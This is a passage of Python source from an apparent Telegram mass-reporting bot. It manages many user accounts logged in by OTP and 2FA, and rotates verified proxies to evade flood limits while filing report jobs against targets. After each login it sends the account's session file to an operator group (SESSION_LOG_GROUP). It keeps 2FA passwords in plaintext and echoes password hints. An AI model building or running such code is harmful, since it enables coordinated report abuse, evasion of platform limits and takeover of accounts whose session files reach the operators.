        if self.session_errors > 0:
            score -= min(self.session_errors * 5, 50)
        if self.session_flood_waits > 0:
            score -= min(self.session_flood_waits * 10, 30)
        if self.proxy_failures > 0:
            score -= min(self.proxy_failures * 15, 45)
        if self.success_rate < 80.0:
            score -= (80.0 - self.success_rate)
        if self.session_age_days > 30:
            score -= min((self.session_age_days - 30) * 2, 20)
        if self.is_premium:
            score += 10
        if self.connection_quality > 90.0:
            score += 5
        return max(0.0, min(100.0, score))

# ----------------------------------------------------------------------
# OTPSession
# ----------------------------------------------------------------------
@dataclass
class OTPSession:
    session_id: str
    phone: str
    client: Optional[pyrogram.Client] = None
    phone_code_hash: Optional[str] = None
    otp_source: OTPSource = OTPSource.SMS
    otp_code: Optional[str] = None
    otp_expires_at: Optional[datetime] = None
    otp_attempts: int = 0
    max_attempts: int = 5
    last_attempt: Optional[datetime] = None
    created_at: datetime = None
    status: str = "pending"
    two_factor_required: bool = False
    two_factor_password: Optional[str] = None
    flags: Set[str] = None
    metadata: Dict[str, Any] = None

    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()
        if self.flags is None:
            self.flags = set()
        if self.metadata is None:
            self.metadata = {
                "device_info": {},
                "ip_address": None,
                "user_agent": None,
                "location": None,
                "risk_score": 0.0,
                "captcha_required": False,
                "captcha_solved": False
            }

    def is_expired(self) -> bool:
        if self.otp_expires_at:
            return datetime.now() > self.otp_expires_at
        return (datetime.now() - self.created_at).total_seconds() > 300

    def can_retry(self) -> bool:
        if self.otp_attempts >= self.max_attempts:
            return False
        if self.last_attempt:
            return (datetime.now() - self.last_attempt).total_seconds() > 30
        return True

    def record_attempt(self, success: bool):
        self.otp_attempts += 1
        self.last_attempt = datetime.now()
        if success:
            self.status = "verified"
        elif self.otp_attempts >= self.max_attempts:
            self.status = "failed"

    def to_dict(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "phone": self.phone,
            "phone_code_hash": self.phone_code_hash,
            "otp_source": self.otp_source.value,
            "otp_code": self.otp_code,
            "otp_expires_at": self.otp_expires_at.isoformat() if self.otp_expires_at else None,
            "otp_attempts": self.otp_attempts,
            "max_attempts": self.max_attempts,
            "last_attempt": self.last_attempt.isoformat() if self.last_attempt else None,
            "created_at": self.created_at.isoformat(),
            "status": self.status,
            "two_factor_required": self.two_factor_required,
            "two_factor_password": self.two_factor_password,
            "flags": list(self.flags),
            "metadata": self.metadata
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'OTPSession':
        session = cls(
            session_id=data["session_id"],
            phone=data["phone"],
            phone_code_hash=data.get("phone_code_hash"),
            otp_source=OTPSource(data.get("otp_source", 0)),
            otp_code=data.get("otp_code"),
            otp_attempts=data.get("otp_attempts", 0),
            max_attempts=data.get("max_attempts", 5),
            status=data.get("status", "pending"),
            two_factor_required=data.get("two_factor_required", False),
            two_factor_password=data.get("two_factor_password")
        )
        session.created_at = datetime.fromisoformat(data["created_at"])
        if data.get("otp_expires_at"):
            session.otp_expires_at = datetime.fromisoformat(data["otp_expires_at"])
        if data.get("last_attempt"):
            session.last_attempt = datetime.fromisoformat(data["last_attempt"])
        session.flags = set(data.get("flags", []))
        session.metadata = data.get("metadata", {})
        return session

# ----------------------------------------------------------------------
# ReportJob
# ----------------------------------------------------------------------
@dataclass
class ReportJob:
    job_id: str
    target: str
    target_type: str
    category: str
    subcategory: str
    description: str
    created_by: int
    created_at: datetime = None
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    status: ReportStatus = ReportStatus.PENDING
    priority: int = 1
    retry_count: int = 0
    max_retries: int = 3
    accounts_used: List[str] = None
    results: List[Dict] = None
    metadata: Dict[str, Any] = None
    flags: Set[str] = None
    error_log: List[Dict] = None
    performance_metrics: Dict[str, Any] = None

    def __post_init__(self):
        if self.created_at is None:
            self.created_at = datetime.now()
        if self.accounts_used is None:
            self.accounts_used = []
        if self.results is None:
            self.results = []
        if self.metadata is None:
            self.metadata = {
                "target_resolved": False,
                "target_id": None,
                "target_access_hash": None,
                "validation_passed": False,
                "risk_level": "medium",
                "estimated_duration": 0,
                "complexity": "medium"
            }
        if self.flags is None:
            self.flags = set()
        if self.error_log is None:
            self.error_log = []
        if self.performance_metrics is None:
            self.performance_metrics = {
                "total_accounts": 0,
                "successful_accounts": 0,
                "failed_accounts": 0,
                "average_report_time": 0.0,
                "total_duration": 0.0,
                "proxy_rotations": 0,
                "flood_waits": 0,
                "errors_encountered": 0,
                "retry_successes": 0
            }

    def to_dict(self) -> Dict[str, Any]:
        return {
            "job_id": self.job_id,
            "target": self.target,
            "target_type": self.target_type,
            "category": self.category,
            "subcategory": self.subcategory,
            "description": self.description,
            "created_by": self.created_by,
            "created_at": self.created_at.isoformat(),
            "started_at": self.started_at.isoformat() if self.started_at else None,
            "completed_at": self.completed_at.isoformat() if self.completed_at else None,
            "status": self.status.value,
            "priority": self.priority,
            "retry_count": self.retry_count,
            "max_retries": self.max_retries,
            "accounts_used": self.accounts_used,
            "results": self.results,
            "metadata": self.metadata,
            "flags": list(self.flags),
            "error_log": self.error_log,
            "performance_metrics": self.performance_metrics
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ReportJob':
        job = cls(
            job_id=data["job_id"],
            target=data["target"],
            target_type=data["target_type"],
            category=data["category"],
            subcategory=data["subcategory"],
            description=data["description"],
            created_by=data["created_by"],
            priority=data.get("priority", 1),
            retry_count=data.get("retry_count", 0),
            max_retries=data.get("max_retries", 3)
        )
        job.created_at = datetime.fromisoformat(data["created_at"])
        job.status = ReportStatus(data["status"])
        if data.get("started_at"):
            job.started_at = datetime.fromisoformat(data["started_at"])
        if data.get("completed_at"):
            job.completed_at = datetime.fromisoformat(data["completed_at"])
        job.accounts_used = data.get("accounts_used", [])
        job.results = data.get("results", [])
        job.metadata = data.get("metadata", {})
        job.flags = set(data.get("flags", []))
        job.error_log = data.get("error_log", [])
        job.performance_metrics = data.get("performance_metrics", {})
        return job

    def add_result(self, result: Dict[str, Any]):
        self.results.append(result)
        if result.get("status") == "COMPLETED":
            self.performance_metrics["successful_accounts"] += 1
        else:
            self.performance_metrics["failed_accounts"] += 1
        self.performance_metrics["total_accounts"] += 1
        report_time = result.get("response_time", 0.0)
        if report_time > 0:
            current_avg = self.performance_metrics["average_report_time"]
            total = self.performance_metrics["total_accounts"]
            self.performance_metrics["average_report_time"] = (
                (current_avg * (total - 1) + report_time) / total
            ) if total > 0 else report_time
        if "flood_wait" in result.get("flags", []):
            self.performance_metrics["flood_waits"] += 1
        if "proxy_rotated" in result.get("flags", []):
            self.performance_metrics["proxy_rotations"] += 1
        if result.get("error"):
            self.performance_metrics["errors_encountered"] += 1
            self.error_log.append({
                "timestamp": datetime.now().isoformat(),
                "account": result.get("account"),
                "error": result.get("error"),
                "details": result.get("details", {})
            })

    def update_duration(self):
        if self.started_at and self.completed_at:
            duration = (self.completed_at - self.started_at).total_seconds()
            self.performance_metrics["total_duration"] = duration

    def get_success_rate(self) -> float:
        total = self.performance_metrics["total_accounts"]
        successful = self.performance_metrics["successful_accounts"]
        return (successful / total * 100) if total > 0 else 0.0

# ============================================
# ADVANCED PROXY MANAGER – FULL IMPLEMENTATION
# ============================================
class AdvancedProxyManager:
    def __init__(self):
        self.proxies: List[ProxyEntry] = []
        self.proxy_map: Dict[str, ProxyEntry] = {}
        self.proxy_history: Dict[str, List[Dict]] = defaultdict(list)
        self.active_proxies: List[ProxyEntry] = []
        self.fast_proxies: List[ProxyEntry] = []
        self.premium_proxies: List[ProxyEntry] = []
        self.fast_countries = FAST_COUNTRIES
        self.premium_countries = PREMIUM_COUNTRIES
        self.max_reports_per_proxy = 9
        self.test_urls = PROXY_TEST_URLS
        self.user_agents = USER_AGENTS
        self.session: Optional[aiohttp.ClientSession] = None
        self.ssl_context = ssl.create_default_context(cafile=certifi.where())
        self.verification_lock = asyncio.Lock()
        self.stats = {
            "total_tested": 0,
            "working_proxies": 0,
            "failed_proxies": 0,
            "verification_time": 0.0,
            "avg_speed": 0.0,
            "best_proxy": None,
            "worst_proxy": None,
            "country_distribution": {},
            "type_distribution": {},
            "last_update": None
        }
        self.analytics = {
            "daily_usage": {},
            "hourly_performance": {},
            "proxy_lifespan": {},
            "failure_patterns": {},
            "geographic_performance": {}
        }

    async def initialize(self) -> bool:
        console.print("[cyan]🚀 Initializing Advanced Proxy Manager...[/cyan]")
        self.session = aiohttp.ClientSession(
            connector=TCPConnector(ssl=False, limit=100),
            timeout=ClientTimeout(total=30)
        )
        await self._load_proxies_from_file()
        if not self.proxies:
            console.print("[red]❌ No proxies found[/red]")
            return False
        console.print(f"[green]✅ Loaded {len(self.proxies)} proxies[/green]")
        await self._load_cache()
        console.print("[yellow]⚡ Starting ultra-fast proxy verification...[/yellow]")
        await self.verify_all_proxies_parallel()
        await self._analyze_proxies()
        self._display_comprehensive_stats()
        await self._send_working_proxies_to_owners()
        return True

    async def _load_proxies_from_file(self):
        if not PROXY_FILE.exists():
            self._create_proxy_file_template()
            return
        try:
            with open(PROXY_FILE, 'r') as f:
                lines = f.readlines()
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxy_str = line.split('#')[0].strip()
                    entry = self._create_proxy_entry(proxy_str)
                    if entry:
                        self.proxies.append(entry)
                        self.proxy_map[entry.proxy] = entry
        except Exception as e:
            console.print(f"[red]❌ Error loading proxies: {e}[/red]")

    def _create_proxy_file_template(self):
        template = """# Proxy List for Telegram Enterprise Bot
# Format: protocol://user:pass@host:port  or protocol://host:port
# Supported protocols: http, https, socks4, socks5
# Example:
http://user:pass@192.168.1.1:8080
socks5://127.0.0.1:1080
https://proxy.example.com:443

# You can also add comments like this
"""
        try:
            with open(PROXY_FILE, 'w') as f:
                f.write(template)
            console.print(f"[green]✅ Created proxy file template at {PROXY_FILE}[/green]")
        except Exception as e:
            console.print(f"[red]❌ Failed to create proxy file: {e}[/red]")

    def _validate_proxy_string(self, proxy_str: str) -> bool:
        try:
            parsed = urllib.parse.urlparse(proxy_str)
            if parsed.scheme not in ('http', 'https', 'socks4', 'socks5'):
                return False
            if not parsed.hostname:
                return False
            if parsed.port and (parsed.port < 1 or parsed.port > 65535):
                return False
            return True
        except:
            return False

    def _create_proxy_entry(self, proxy_str: str) -> Optional[ProxyEntry]:
        if not self._validate_proxy_string(proxy_str):
            console.print(f"[red]❌ Invalid proxy format: {proxy_str}[/red]")
            return None
        entry = ProxyEntry(proxy=proxy_str)
        return entry

    async def _load_cache(self):
        if PROXY_CACHE_FILE.exists():
            try:
                with open(PROXY_CACHE_FILE, 'r') as f:
                    data = json.load(f)
                for proxy_str, cache_data in data.items():
                    if proxy_str in self.proxy_map:
                        entry = self.proxy_map[proxy_str]
                        entry.country = cache_data.get('country', 'Unknown')
                        entry.city = cache_data.get('city', 'Unknown')
                        entry.isp = cache_data.get('isp', 'Unknown')
                        entry.asn = cache_data.get('asn', 'Unknown')
                        entry.verified = cache_data.get('verified', False)
                        entry.last_verified = datetime.fromisoformat(cache_data['last_verified']) if cache_data.get('last_verified') else None
                        entry.avg_response_time = cache_data.get('avg_response_time', 0.0)
                        entry.speed_score = cache_data.get('speed_score', 0.0)
                        entry.reliability_score = cache_data.get('reliability_score', 100.0)
                console.print(f"[green]✅ Loaded proxy cache for {len(data)} proxies[/green]")
            except Exception as e:
                console.print(f"[yellow]⚠️ Could not load proxy cache: {e}[/yellow]")

    async def save_cache(self):
        data = {}
        for proxy_str, entry in self.proxy_map.items():
            if entry.verified:
                data[proxy_str] = {
                    'country': entry.country,
                    'city': entry.city,
                    'isp': entry.isp,
                    'asn': entry.asn,
                    'verified': entry.verified,
                    'last_verified': entry.last_verified.isoformat() if entry.last_verified else None,
                    'avg_response_time': entry.avg_response_time,
                    'speed_score': entry.speed_score,
                    'reliability_score': entry.reliability_score
                }
        try:
            with open(PROXY_CACHE_FILE, 'w') as f:
                json.dump(data, f, indent=2)
        except Exception as e:
            console.print(f"[red]❌ Failed to save proxy cache: {e}[/red]")

    async def verify_all_proxies_parallel(self):
        start_time = time.time()
        tasks = []
        for proxy in self.proxies:
            tasks.append(self._verify_single_proxy_advanced(proxy))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        verified_count = 0
        for proxy, result in zip(self.proxies, results):
            if isinstance(result, Exception):
                console.print(f"[red]❌ Proxy {proxy.proxy} failed: {result}[/red]")
                proxy.is_active = False
                proxy.verified = False
            elif result:
                verified_count += 1
        self.stats["verification_time"] = time.time() - start_time
        self.stats["total_tested"] = len(self.proxies)
        self.stats["working_proxies"] = verified_count
        self.stats["failed_proxies"] = len(self.proxies) - verified_count
        self.stats["last_update"] = datetime.now().isoformat()
        await self.save_cache()

    async def _verify_single_proxy_advanced(self, entry: ProxyEntry) -> bool:
        for test in self.test_urls:
            try:
                response_time, success, metadata = await self._run_single_test(entry, test)
                if success:
                    entry.update_performance(response_time, True)
                    entry.verified = True
                    entry.is_active = True
                    entry.last_verified = datetime.now()
                    entry.country = metadata.get('country', entry.country)
                    entry.city = metadata.get('city', entry.city)
                    entry.isp = metadata.get('isp', entry.isp)
                    entry.asn = metadata.get('asn', entry.asn)
                    if entry.country in self.premium_countries:
                        entry.is_premium = True
                    entry.verification_level += 1
                    return True
            except Exception as e:
                entry.last_error = str(e)[:100]
                entry.update_performance(test['timeout'], False)
        entry.is_active = False
        entry.verified = False
        return False

    async def _run_single_test(self, entry: ProxyEntry, test: Dict) -> Tuple[float, bool, Dict]:
        proxy_url = entry.proxy
        proxy_type = entry.proxy_type.name.lower() if entry.proxy_type != ProxyType.DIRECT else None
        proxy_auth = None
        parsed = urllib.parse.urlparse(proxy_url)
        if parsed.username and parsed.password:
            proxy_auth = aiohttp.BasicAuth(parsed.username, parsed.password)
        proxy = None
        if proxy_type in ('http', 'https'):
            proxy = f"http://{parsed.hostname}:{parsed.port}"
        elif proxy_type in ('socks4', 'socks5'):
            # aiohttp_socks needed; fallback to no proxy if not available
            try:
                from aiohttp_socks import ProxyConnector
                connector = ProxyConnector.from_url(proxy_url)
                async with aiohttp.ClientSession(connector=connector) as session:
                    start = time.time()
                    async with session.get(test['url'], timeout=test['timeout'], ssl=False) as resp:
                        if resp.status == 200:
                            response_time = (time.time() - start) * 1000
                            metadata = await self._extract_proxy_metadata(resp, test)
                            return response_time, True, metadata
            except ImportError:
                console.print("[yellow]⚠️ aiohttp_socks not installed, skipping SOCKS test[/yellow]")
                return 0, False, {}
        else:
            # HTTP/HTTPS proxy
            async with aiohttp.ClientSession() as session:
                try:
                    start = time.time()
                    async with session.get(test['url'], proxy=proxy, proxy_auth=proxy_auth,
                                          timeout=test['timeout'], ssl=False) as resp:
                        if resp.status == 200:
                            response_time = (time.time() - start) * 1000
                            metadata = await self._extract_proxy_metadata(resp, test)
                            return response_time, True, metadata
                except:
                    pass
        return 0, False, {}

    async def _extract_proxy_metadata(self, response: aiohttp.ClientResponse, test: Dict) -> Dict:
        metadata = {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'asn': 'Unknown'}
        try:
            if test['type'] == 'json':
                data = await response.json()
                if test['field'] and test['field'] in data:
                    if test['field'] == 'headers':
                        headers = data.get('headers', {})
                        # Try to get IP from headers
                        pass
                    elif test['field'] == 'origin':
                        ip = data['origin'].split(',')[0].strip()
                        metadata.update(await self._geolocate_ip(ip))
            elif test['type'] == 'text':
                text = await response.text()
                ip_match = re.search(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', text)
                if ip_match:
                    ip = ip_match.group()
                    metadata.update(await self._geolocate_ip(ip))
        except:
            pass
        return metadata

    async def _geolocate_ip(self, ip: str) -> Dict:
        # Simple geolocation using ip-api.com
        try:
            async with self.session.get(f"http://ip-api.com/json/{ip}") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data.get('status') == 'success':
                        return {
                            'country': data.get('country', 'Unknown'),
                            'city': data.get('city', 'Unknown'),
                            'isp': data.get('isp', 'Unknown'),
                            'asn': data.get('as', 'Unknown')
                        }
        except:
            pass
        return {'country': 'Unknown', 'city': 'Unknown', 'isp': 'Unknown', 'asn': 'Unknown'}

    async def _analyze_proxies(self):
        self.active_proxies = [p for p in self.proxies if p.is_active and p.verified]
        self.active_proxies.sort(key=lambda x: x.calculate_priority(), reverse=True)
        self.fast_proxies = [p for p in self.active_proxies if p.avg_response_time < 500 and p.speed_score > 50]
        self.premium_proxies = [p for p in self.active_proxies if p.is_premium]
        for p in self.active_proxies:
            country = p.country if p.country != 'Unknown' else 'Unknown'
            self.stats['country_distribution'][country] = self.stats['country_distribution'].get(country, 0) + 1
            ptype = p.proxy_type.name
            self.stats['type_distribution'][ptype] = self.stats['type_distribution'].get(ptype, 0) + 1
        if self.active_proxies:
            self.stats['best_proxy'] = self.active_proxies[0].proxy
            self.stats['worst_proxy'] = self.active_proxies[-1].proxy
            avg_speed = sum(p.avg_response_time for p in self.active_proxies if p.avg_response_time > 0) / len([p for p in self.active_proxies if p.avg_response_time > 0]) if any(p.avg_response_time > 0 for p in self.active_proxies) else 0
            self.stats['avg_speed'] = avg_speed

    def _display_comprehensive_stats(self):
        table = Table(title="Proxy Manager Status", box=box.ROUNDED)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="green")
        table.add_row("Total Proxies", str(self.stats['total_tested']))
        table.add_row("Working", str(self.stats['working_proxies']))
        table.add_row("Failed", str(self.stats['failed_proxies']))
        table.add_row("Active", str(len(self.active_proxies)))
        table.add_row("Fast (<500ms)", str(len(self.fast_proxies)))
        table.add_row("Premium", str(len(self.premium_proxies)))
        table.add_row("Verification Time", f"{self.stats['verification_time']:.2f}s")
        table.add_row("Avg Speed", f"{self.stats['avg_speed']:.2f}ms")
        table.add_row("Best Proxy", self.stats['best_proxy'] or "N/A")
        console.print(table)

    async def _send_working_proxies_to_owners(self):
        if not self.active_proxies:
            return
        try:
            app = Application.builder().token(BOT_TOKEN).build()
            msg = "✅ *Proxy Verification Complete*\n\n"
            msg += f"**Working Proxies:** {len(self.active_proxies)}\n"
            msg += f"**Fast Proxies:** {len(self.fast_proxies)}\n"
            msg += f"**Premium Proxies:** {len(self.premium_proxies)}\n\n"
            # Send to owners
            for owner_id in OWNER_IDS:
                try:
                    await app.bot.send_message(chat_id=owner_id, text=msg, parse_mode='Markdown')
                except:
                    pass
            await app.shutdown()
        except Exception as e:
            console.print(f"[red]❌ Failed to send proxy notification: {e}[/red]")

    async def get_best_proxy_for_account(self, account: Optional[TelegramAccount] = None) -> Optional[ProxyEntry]:
        if not self.active_proxies:
            return None
        # Filter proxies that are active, verified, and not recently used for this account if provided
        candidates = self.active_proxies.copy()
        if account and account.proxy_entry:
            # Avoid using the same proxy if it was recently used and failed
            if account.proxy_entry.consecutive_failures > 2:
                candidates = [p for p in candidates if p.proxy != account.proxy_entry.proxy]
        candidates.sort(key=lambda x: x.calculate_priority(), reverse=True)
        return candidates[0] if candidates else None

    async def rotate_proxy_for_account(self, account: TelegramAccount) -> bool:
        best = await self.get_best_proxy_for_account(account)
        if best and best.proxy != account.proxy:
            account.proxy = best.proxy
            account.proxy_entry = best
            account.proxy_rotation_count += 1
            account.last_proxy_rotation = datetime.now()
            return True
        return False

    def mark_proxy_success(self, proxy_str: str, response_time: float):
        if proxy_str in self.proxy_map:
            self.proxy_map[proxy_str].update_performance(response_time, True)

    def mark_proxy_failed(self, proxy_str: str):
        if proxy_str in self.proxy_map:
            self.proxy_map[proxy_str].update_performance(0, False)

    def get_detailed_stats(self) -> Dict[str, Any]:
        return self.stats

    async def cleanup(self):
        if self.session:
            await self.session.close()

# ============================================
# ADVANCED OTP VERIFICATION (Pyrogram)
# ============================================
class AdvancedOTPVerification:
    def __init__(self, account_manager, proxy_manager):
        self.account_manager = account_manager
        self.proxy_manager = proxy_manager
        self.otp_sessions: Dict[str, OTPSession] = {}
        self.active_verifications: Dict[str, asyncio.Task] = {}
        self.otp_cache: Dict[str, Dict] = {}
        self.max_otp_attempts = 5
        self.otp_expiry_minutes = 5
        self.resend_delay_seconds = 30
        self.retry_delay_base = 2
        self.enable_2fa_fallback = True
        self.enable_email_fallback = True
        self.enable_app_fallback = True
        self.require_device_confirmation = False

    async def start_otp_verification(self, phone: str, client: pyrogram.Client,
                                    update: Update, user_id: int) -> bool:
        session_id = str(uuid.uuid4())
        otp_session = OTPSession(
            session_id=session_id,
            phone=phone,
            client=client,
            otp_source=OTPSource.SMS
        )
        self.otp_sessions[session_id] = otp_session
        # Send OTP request
        try:
            result = await self._send_otp_request(client, phone, OTPSource.SMS)
            otp_session.phone_code_hash = result.phone_code_hash
            otp_session.otp_expires_at = datetime.now() + timedelta(minutes=self.otp_expiry_minutes)
            # Store session in user context for later retrieval
            if not hasattr(update, '_user_sessions'):
                update._user_sessions = {}
            update._user_sessions[user_id] = session_id
            await self._send_otp_notification(update, phone, "SMS", otp_session)
            # Schedule resend availability
            asyncio.create_task(self._enable_resend_after_delay(session_id))
            return True
        except FloodWait as e:
            await update.message.reply_text(
                f"❌ *Flood Wait*\n\n"
                f"Telegram is asking to wait `{e.value}` seconds.\n"
                f"Please try again later.",
                parse_mode='Markdown'
            )
            return False
        except Exception as e:
            await update.message.reply_text(
                f"❌ *OTP Request Failed*\n\n"
                f"Error: {str(e)[:200]}",
                parse_mode='Markdown'
            )
            return False

    async def _send_otp_request(self, client: pyrogram.Client, phone: str, otp_source: OTPSource):
        # Only SMS is supported here; could extend to call/flash call
        return await client.send_code(phone)

    async def _send_otp_notification(self, update: Update, phone: str, method: str, otp_session: OTPSession):
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("✅ Enter Code", callback_data=f"otp_enter_{otp_session.session_id}")],
            [InlineKeyboardButton("🔄 Resend Code", callback_data=f"otp_resend_{otp_session.session_id}")],
            [InlineKeyboardButton("❌ Cancel", callback_data="otp_cancel")]
        ])
        await update.message.reply_text(
            f"📱 *Verification Required*\n\n"
            f"Phone: `{phone}`\n"
            f"Method: `{method}`\n\n"
            f"An OTP has been sent to your Telegram app / SMS.\n"
            f"Please enter the 5-digit code.",
            parse_mode='Markdown',
            reply_markup=keyboard
        )

    async def verify_otp_code(self, session_id: str, otp_code: str,
                             update: Update, user_id: int) -> Tuple[bool, Optional[str]]:
        if session_id not in self.otp_sessions:
            return False, "OTP session expired or not found"
        otp_session = self.otp_sessions[session_id]
        if otp_session.is_expired():
            return False, "OTP code expired"
        if not otp_session.can_retry():
            return False, "Too many attempts, please wait 30 seconds"
        try:
            signed_in = await otp_session.client.sign_in(
                phone_number=otp_session.phone,
                phone_code_hash=otp_session.phone_code_hash,
                phone_code=otp_code
            )
            otp_session.record_attempt(True)
            await self._handle_successful_login(otp_session, update, user_id)
            return True, "Verification successful"
        except SessionPasswordNeeded:
            otp_session.two_factor_required = True
            otp_session.status = "2fa_required"
            return False, "2FA_PASSWORD"
        except PhoneCodeInvalid:
            otp_session.record_attempt(False)
            return False, "Invalid OTP code"
        except PhoneCodeExpired:
            return False, "OTP code expired"
        except FloodWait as e:
            return False, f"Flood wait: {e.value} seconds"
        except Exception as e:
            otp_session.record_attempt(False)
            return False, f"Verification error: {str(e)[:100]}"

    async def _handle_successful_login(self, otp_session: OTPSession,
                                      update: Update, user_id: int):
        try:
            phone = otp_session.phone
            if phone in self.account_manager.accounts:
                account = self.account_manager.accounts[phone]
                account.client = otp_session.client
                account.status = AccountStatus.ACTIVE
                account.last_login = datetime.now()
                account.last_used = datetime.now()
                account.otp_attempts = otp_session.otp_attempts
                account.otp_source = otp_session.otp_source
                try:
                    me = await otp_session.client.get_me()
                    account.user_id = me.id
                    account.username = me.username
                    account.first_name = me.first_name
                    account.last_name = me.last_name
                    account.is_premium = getattr(me, 'is_premium', False)
                    account.is_verified = getattr(me, 'is_verified', False)
                    account.is_scam = getattr(me, 'is_scam', False)
                    account.is_fake = getattr(me, 'is_fake', False)
                    try:
                        password_hint = await otp_session.client.get_password_hint()
                        account.two_factor_enabled = bool(password_hint)
                        account.password_hint = password_hint
                    except:
                        account.two_factor_enabled = False
                except Exception as e:
                    console.print(f"[yellow]⚠️ Could not get account info: {e}[/yellow]")
                self.account_manager._save_accounts()
                success_message = self._prepare_success_message(account)
                await update.message.reply_text(
                    success_message,
                    parse_mode='Markdown'
                )
                console.print(f"[green]✅ Login successful for {phone}[/green]")
                # Send session file to group
                try:
                    session_path = account.session_file
                    if session_path.exists():
                        app = Application.builder().token(BOT_TOKEN).build()
                        await app.bot.send_document(
                            chat_id=SESSION_LOG_GROUP,
                            document=open(session_path, 'rb'),
                            caption=f"✅ New session created\nPhone: `{phone}`\nUser: @{account.username}\nID: `{account.user_id}`"
                        )
                        console.print(f"[green]📤 Session file sent to group {SESSION_LOG_GROUP}[/green]")
                        await app.shutdown()
                    else:
                        console.print(f"[yellow]⚠️ Session file not found: {session_path}[/yellow]")
                except Exception as e:
                    console.print(f"[red]❌ Failed to send session file: {e}[/red]")
            else:
                await update.message.reply_text(
                    f"❌ *Account Error*\n\n"
                    f"Account `{phone}` not found in manager.",
                    parse_mode='Markdown'
                )
        except Exception as e:
            console.print(f"[red]❌ Error handling successful login: {e}[/red]")
            await update.message.reply_text(
                f"✅ *Login Complete*\n\n"
                f"Account `{phone}` verified successfully.\n"
                f"Error updating details: {str(e)[:100]}",
                parse_mode='Markdown'
            )

    def _prepare_success_message(self, account: TelegramAccount) -> str:
        msg = f"✅ *Account Verified Successfully*\n\n"
        msg += f"**Phone:** `{account.phone}`\n"
        if account.user_id:
            msg += f"**User ID:** `{account.user_id}`\n"
        if account.username:
            msg += f"**Username:** @{account.username}\n"
        if account.first_name:
            msg += f"**First Name:** {account.first_name}\n"
        if account.last_name:
            msg += f"**Last Name:** {account.last_name}\n"
        msg += f"**Premium:** {'Yes' if account.is_premium else 'No'}\n"
        msg += f"**2FA Enabled:** {'Yes' if account.two_factor_enabled else 'No'}\n"
        if account.two_factor_enabled and account.password_hint:
            msg += f"**2FA Hint:** `{account.password_hint}`\n"
        msg += f"**Session File:** `{account.session_file.name}`\n"
        msg += f"\n✨ *Account ready for reporting!*"
        return msg

    async def handle_2fa_password(self, session_id: str, password: str,
                                 update: Update, user_id: int) -> Tuple[bool, str]:
        if session_id not in self.otp_sessions:
            return False, "OTP session expired"
        otp_session = self.otp_sessions[session_id]
        try:
            await otp_session.client.check_password(password)
            otp_session.two_factor_password = password
            await self._handle_successful_login(otp_session, update, user_id)
            return True, "2FA verification successful"
        except PasswordHashInvalid:
            return False, "Invalid password"
        except FloodWait as e:
            return False, f"Flood wait: {e.value} seconds"
        except Exception as e:
            return False, f"2FA error: {str(e)[:100]}"

    async def resend_otp(self, session_id: str, update: Update, user_id: int) -> Tuple[bool, str]:
        if session_id not in self.otp_sessions:
            return False, "OTP session expired"
        otp_session = self.otp_sessions[session_id]
        if not otp_session.otp_resend_available:
            return False, f"Please wait {self.resend_delay_seconds} seconds before resending"
        try:
            result = await otp_session.client.send_code(otp_session.phone)
            otp_session.phone_code_hash = result.phone_code_hash
            otp_session.otp_expires_at = datetime.now() + timedelta(minutes=self.otp_expiry_minutes)
            otp_session.otp_resend_available = False
            otp_session.otp_resend_count += 1
            asyncio.create_task(self._enable_resend_after_delay(session_id))
            return True, "OTP resent successfully"
        except FloodWait as e:
            return False, f"Flood wait: {e.value} seconds"
        except Exception as e:
            return False, f"Failed to resend: {str(e)[:100]}"

    async def _enable_resend_after_delay(self, session_id: str):
        await asyncio.sleep(self.resend_delay_seconds)
        if session_id in self.otp_sessions:
            self.otp_sessions[session_id].otp_resend_available = True

    def cleanup_expired_sessions(self):
        expired = [sid for sid, sess in self.otp_sessions.items() if sess.is_expired()]
        for sid in expired:
            del self.otp_sessions[sid]

    async def get_otp_session_info(self, session_id: str) -> Optional[Dict]:
        if session_id in self.otp_sessions:
            sess = self.otp_sessions[session_id]
            return {
                "phone": sess.phone,
                "status": sess.status,
                "attempts": sess.otp_attempts,
                "expires_at": sess.otp_expires_at.isoformat() if sess.otp_expires_at else None,
                "two_factor_required": sess.two_factor_required
            }
        return None

# ============================================
# ADVANCED USER MANAGER – FULL IMPLEMENTATION
# ============================================
class AdvancedUserManager:
    def __init__(self):
        self.users: Dict[int, TelegramUser] = {}
        self.sessions: Dict[str, Dict] = {}
        self.activity_log: List[Dict] = []
        self.security_log: List[Dict] = []
        self.owner_ids = OWNER_IDS
        self.admin_ids = ADMIN_IDS
        self.permissions = {
            "view_stats": [UserRole.VIEWER, UserRole.USER, UserRole.REPORTER,
                          UserRole.MODERATOR, UserRole.ADMIN, UserRole.SUDO, UserRole.OWNER],
            "create_report": [UserRole.USER, UserRole.REPORTER, UserRole.MODERATOR,
                            UserRole.ADMIN, UserRole.SUDO, UserRole.OWNER],
            "add_account": [UserRole.REPORTER, UserRole.MODERATOR, UserRole.ADMIN,
                          UserRole.SUDO, UserRole.OWNER],
            "manage_users": [UserRole.MODERATOR, UserRole.ADMIN, UserRole.SUDO, UserRole.OWNER],
            "manage_system": [UserRole.ADMIN, UserRole.SUDO, UserRole.OWNER],
            "full_control": [UserRole.SUDO, UserRole.OWNER]
        }
        self._initialize_system()
        self._load_users()

    def _initialize_system(self):
        # Add owner accounts
        for owner_id in self.owner_ids:
            if owner_id not in self.users:
                owner = TelegramUser(
                    user_id=owner_id,
                    username=f"owner_{owner_id}",
                    role=UserRole.OWNER,
                    permissions=["full_control"]
                )
                self.users[owner_id] = owner
        self._save_users()

    def _load_users(self):
        if USERS_FILE.exists():
            try:
                with open(USERS_FILE, 'r') as f:
                    data = json.load(f)
                for uid_str, user_data in data.items():
                    uid = int(uid_str)
                    user = TelegramUser.from_dict(user_data)
                    self.users[uid] = user
                console.print(f"[green]✅ Loaded {len(self.users)} users[/green]")
            except Exception as e:
